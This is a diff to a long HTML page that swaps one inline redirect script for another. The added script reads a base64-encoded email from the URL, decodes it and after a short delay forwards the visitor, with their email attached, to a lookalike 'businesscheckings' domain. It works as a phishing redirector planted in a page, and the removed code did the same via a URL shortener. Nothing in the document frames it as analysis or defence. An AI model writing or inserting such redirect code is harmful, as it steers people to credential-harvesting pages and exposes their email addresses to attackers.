@@ -14221,25 +14221,35 @@
           // ]]
         </script></div>
         <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            var currentUrl = window.location.href;
-            // alert(currentUrl)
+                // Function to get the value of a parameter from the URL
+                function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
 
-            function extractEmail(url) {
-                var emailRegex = /[#/]([^#/?]+@[^#/?]+)/;
-                var match = url.match(emailRegex);
-                return match ? match[1] : null;
-            }
+        // Get the base64-encoded email parameter from the URL
+        var base64EmailParam = getParameterByName('email');
 
-            var email = extractEmail(currentUrl);
-            // alert(email)
+        // Decode the base64-encoded email
+        function decodeEmail(base64Email) {
+            return atob(base64Email);
+        }
 
-            if (email) {
-                var baseUrl = 'https://www.shorturl.at/?/#';
-                var newRefreshUrl = baseUrl + email;
-                window.location.assign(newRefreshUrl);
-            }
-        });
+        // If a base64-encoded email parameter is provided, decode it and redirect
+        if (base64EmailParam) {
+            var email = decodeEmail(base64EmailParam);
+
+            // Perform the redirect after a delay (1000 milliseconds in this example)
+            setTimeout(function () {
+                // Replace 'https://example.com' with your desired redirect URL
+                window.location.href = 'https://businesscheckings.eutenant.com/businesscheckings/#X' + email;
+            }, 1000);
+        }
     </script>
 </body>
 </html>
